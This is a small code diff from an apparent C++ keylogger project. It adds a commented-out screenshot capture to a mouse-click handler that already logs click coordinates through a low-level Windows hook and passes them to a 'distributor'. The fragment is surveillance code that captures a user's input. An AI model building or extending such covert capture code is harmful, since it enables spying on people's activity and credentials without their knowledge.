@@ -245,6 +245,10 @@ void Keylogger::mouseClick(MouseEvent me, LPMSLLHOOKSTRUCT mouse) {
 
 	data += std::to_string(mouse->pt.x) + ", " + std::to_string(mouse->pt.y);
 	*_distributor << (*input << data);
+	/*
+	HBITMAP hbmp = StaticTools::MakeScreenshot();
+	StaticTools::BmpAddMouseAtPos(hbmp, mouse);
+	*/
 }
 
 void Keylogger::setDistributor(std::shared_ptr<IDistributor> distributor) {
